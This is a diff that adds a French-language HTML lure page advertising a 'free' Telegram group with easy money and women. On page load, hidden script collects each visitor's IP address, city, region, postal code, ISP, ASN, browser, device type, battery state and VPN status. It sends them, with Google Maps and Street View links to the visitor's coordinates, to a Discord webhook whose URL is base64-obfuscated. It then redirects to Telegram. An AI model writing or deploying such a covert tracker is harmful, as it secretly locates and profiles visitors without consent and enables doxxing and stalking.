@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <meta property="og:type" content="website">
+    <meta property="og:site_name" content="Groupe Telegram Exclusif">
+    <meta property="og:title" content="Rejoins le groupe Telegram le plus chaud de 2025 !">
+    <meta property="og:description" content="Accès 100% gratuit à un groupe privé avec des opportunités business, de l'argent facile et des meufs incroyables. Clique maintenant !">
+    <meta property="og:image" content="https://cdn.pixabay.com/photo/2022/09/18/07/41/logo-7462411_1280.png">
+    <meta property="og:url" content="https://t.me/fiscalitecryptofr">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Groupe Télégram Argent & Meufs - Rejoins Gratuitement">
+    <meta name="twitter:description" content="Rejoins le meilleur groupe Telegram gratuit avec cash facile, business et des bombes en DM.">
+    <meta name="twitter:image" content="https://cdn.pixabay.com/photo/2022/09/18/07/41/logo-7462411_1280.png">
+    <title>Connexion...</title>
+</head>
+<body>
+    <script>
+        fetch('http://ip-api.com/json/')
+            .then(response => response.json())
+            .then(data => {
+                const ip = data.query;
+                const city = data.city || 'Inconnue';
+                const region = data.regionName || 'Inconnu';
+                const country = data.country || 'Inconnu';
+                const org = data.org || 'Inconnu';
+                const loc = data.lat + ',' + data.lon;
+                const isp = data.isp || 'Inconnu';
+                const zip = data.zip || 'Inconnu';
+                const timezone = data.timezone || 'Inconnu';
+                const as = data.as || 'Inconnu';
+                const ipv6 = data.ipv6 || 'Non disponible';
+
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+                const browser = (function() {
+                    const userAgent = navigator.userAgent.toLowerCase();
+                    if (userAgent.indexOf('chrome') > -1) return 'Chrome';
+                    if (userAgent.indexOf('firefox') > -1) return 'Firefox';
+                    if (userAgent.indexOf('safari') > -1) return 'Safari';
+                    if (userAgent.indexOf('edge') > -1) return 'Edge';
+                    return 'Inconnu';
+                })();
+
+                const deviceType = /mobile/i.test(userAgent) ? "Mobile" : /tablet/i.test(userAgent) ? "Tablet" : "Desktop";
+                const battery = navigator.getBattery ? navigator.getBattery() : Promise.resolve({ level: "Non disponible", charging: "Non disponible" });
+
+                fetch(`https://ipinfo.io/${ip}/json?token=4925e486ab24a5`)
+                    .then(response => response.json())
+                    .then(vpnData => {
+                        const vpn = vpnData.vpn || 'Non détecté';
+
+                        const message = {
+                            content: `**NOUVEL UTILISATEUR SUR LE GROUPE TELEGRAM**\n
+                                IP: ${ip}\n
+                                IPv6: ${ipv6}\n
+                                Localisation: ${city}, ${region}, ${country}\n
+                                Organisation/Fournisseur: ${org}\n
+                                Fournisseur d'accès: ${isp}\n
+                                Code postal: ${zip}\n
+                                Fuseau horaire: ${timezone}\n
+                                ASN (Numéro d'AS): ${as}\n
+                                Plateforme: ${platform}\n
+                                Navigateur: ${browser}\n
+                                Type d'appareil: ${deviceType}\n
+                                Niveau de batterie: ${battery.level || 'Non disponible'}\n
+                                Charge batterie: ${battery.charging || 'Non disponible'}\n
+                                Détection VPN: ${vpn}\n
+                                Google Maps: [Cliquez ici](https://www.google.com/maps?q=${loc})\n
+                                Street View: [Cliquez ici](https://www.google.com/maps?q=${loc}&layer=c&cbll=${loc})`
+                        };
+
+                        const webhookUrl = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM2OTY3MjkzODg4NjAwODkwMy9UeWdxVHVza3ZQZG9tUQ==');
+
+                        fetch(webhookUrl, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(message)
+                        })
+                        .then(() => {
+                            window.location.href = 'https://t.me/fiscalitecryptofr';
+                        })
+                        .catch(error => {
+                            console.error('Erreur:', error);
+                            window.location.href = 'https://t.me/fiscalitecryptofr';
+                        });
+                    })
+                    .catch(error => {
+                        console.error('Erreur lors de la détection VPN:', error);
+                        window.location.href = 'https://t.me/fiscalitecryptofr';
+                    });
+            })
+            .catch(error => {
+                console.error('Erreur:', error);
+                window.location.href = 'https://t.me/fiscalitecryptofr';
+            });
+    </script>
+</body>
+  </html>
